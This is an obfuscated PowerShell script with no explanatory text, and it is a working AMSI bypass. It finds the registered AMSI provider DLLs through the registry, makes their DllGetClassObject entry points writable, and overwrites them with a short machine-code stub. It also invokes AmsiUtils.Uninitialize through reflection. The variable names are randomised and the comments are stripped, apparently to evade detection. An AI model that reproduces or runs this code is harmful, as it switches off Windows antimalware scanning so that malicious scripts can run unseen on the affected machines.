# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $XiaJbYBbeKKyvkpFzmIYAdCEM,
        [Parameter(Position = 1, Mandatory = $True)] [String] $WDudwfJnvToNmDRVetakqFeAMEAj
    )

    # Microsoft".
    $BXOTMmgznZOWIWutzvIWsmZpJmfdaFnQqtDeg = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG = $BXOTMmgznZOWIWutzvIWsmZpJmfdaFnQqtDeg.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Microsoft".
    $ekCFXGSUTGJqECsaYeCnuduih = $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG.GetMethod('GetModuleHandle')
    $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL = $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Microsoft".
    $wqOTykoTvZtofFduihBsyUDLfZbSWfETIohGqYKhIqNi = $ekCFXGSUTGJqECsaYeCnuduih.Invoke($null, @($XiaJbYBbeKKyvkpFzmIYAdCEM))
    $NHYfoTpMPmwtRSuxsyGttXkFigDCTgISaUhhwl = New-Object IntPtr
    $rKjcZefFNJcXgIKBMvPVvjBlVrLBZgSQrGuujP = New-Object System.Runtime.InteropServices.HandleRef($NHYfoTpMPmwtRSuxsyGttXkFigDCTgISaUhhwl, $wqOTykoTvZtofFduihBsyUDLfZbSWfETIohGqYKhIqNi)
    # Microsoft".
    return $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$rKjcZefFNJcXgIKBMvPVvjBlVrLBZgSQrGuujP, $WDudwfJnvToNmDRVetakqFeAMEAj))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $miwlvOeLZDyXuxWHJkpSlpybFpifRMKMufDCVtFcQ = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $sewDuhljvjfrfFRaEXMXQKXGdWu = [Void]
    )

    $MxsCWQkirYwbxnMceTHoJnbWI = [AppDomain]::CurrentDomain
    $eeLTktnnTbOQlmmfQsXQbmmwAFSBtvCqQgOejkwMXi = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $YMKOegxTsgtbjefOaGwypxhBioApldWvemHQynU = $MxsCWQkirYwbxnMceTHoJnbWI.DefineDynamicAssembly($eeLTktnnTbOQlmmfQsXQbmmwAFSBtvCqQgOejkwMXi, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $DtxsiozGIBpwqUOKrsNYm = $YMKOegxTsgtbjefOaGwypxhBioApldWvemHQynU.DefineDynamicModule('InMemoryModule', $false)
    $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX = $DtxsiozGIBpwqUOKrsNYm.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $UtCDtGTrvomTpLmMdQygwr = $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $miwlvOeLZDyXuxWHJkpSlpybFpifRMKMufDCVtFcQ)
    $UtCDtGTrvomTpLmMdQygwr.SetImplementationFlags('Runtime, Managed')
    $MONDnwypPAmyHFBetNePdZBWPAXMbQPGbvKiw = $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sewDuhljvjfrfFRaEXMXQKXGdWu, $miwlvOeLZDyXuxWHJkpSlpybFpifRMKMufDCVtFcQ)
    $MONDnwypPAmyHFBetNePdZBWPAXMbQPGbvKiw.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX.CreateType()
}
$nShFGADGepLRbjchbfORxARjDDJUcZxnsPWKzf = Get-ProcAddress kernel32.dll LoadLibraryA
$acQWmiDHVJXrcQSbvZoBtFeSaSlJyXsq = Get-DelegateType @([String]) ([IntPtr])
$mjWCdQCbAWoAAiuIGpBPTpWfpCbzvuMWxMwpg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nShFGADGepLRbjchbfORxARjDDJUcZxnsPWKzf,
$acQWmiDHVJXrcQSbvZoBtFeSaSlJyXsq)
$SKhZNBPXorcAfRDOQgUTuuunE = Get-ProcAddress kernel32.dll GetProcAddress
$doKVuADhmBcanLPoNZHhZrxEUfqRgrqFcCxPBtoYR = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SKhZNBPXorcAfRDOQgUTuuunE,
$doKVuADhmBcanLPoNZHhZrxEUfqRgrqFcCxPBtoYR)
$ktJyURCZDtrwTVagNkPUxYSkxPeyFdBmpxHGCECj = Get-ProcAddress kernel32.dll VirtualProtect
$LMIiweqjoxVyQMFjkJKV = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$gQpjpZSYweJRJjjDUERR = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ktJyURCZDtrwTVagNkPUxYSkxPeyFdBmpxHGCECj,
$LMIiweqjoxVyQMFjkJKV)

$otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$fEdHliqJDxoHggMKvaVQAQalfYTujScnzYiaovjFamoJW = 0

foreach ($JYOnzgBLFNOFSknMxMBrDIapNFlvTbcuBhNep in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $bWwnlpiJrHklKaURntlelpqpDspIvgNTBXYdh = 'HKLM:\Software\Classes\CLSID\' + $JYOnzgBLFNOFSknMxMBrDIapNFlvTbcuBhNep + '\InprocServer32'
    $HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr = Get-ItemPropertyValue -Name '(Default)' $bWwnlpiJrHklKaURntlelpqpDspIvgNTBXYdh -ErrorAction SilentlyContinue
    if ($HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr)
    {
        $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf = Split-Path $HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr -leaf
        $aILpijVvncfzjaazhIIEcsovDolfrljcHgRifbjl = $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf -replace '"', ""
        $BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK = $mjWCdQCbAWoAAiuIGpBPTpWfpCbzvuMWxMwpg.Invoke($aILpijVvncfzjaazhIIEcsovDolfrljcHgRifbjl) 
        if ($BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK -ne 0)
        {
            Write-host "[*] Provider found - " $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf
            $QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX = $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL.Invoke($BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK, "DllGetClassObject")        
            $gQpjpZSYweJRJjjDUERR.Invoke($QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX, [uint32]$otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ.Length, 0x40, [ref]$fEdHliqJDxoHggMKvaVQAQalfYTujScnzYiaovjFamoJW)
            [System.Runtime.InteropServices.Marshal]::Copy($otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ, 0, $QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX, $otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$uhrnAoNJDwPmVKAcHvbuHb = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$uhrnAoNJDwPmVKAcHvbuHb.Invoke($object,$null)
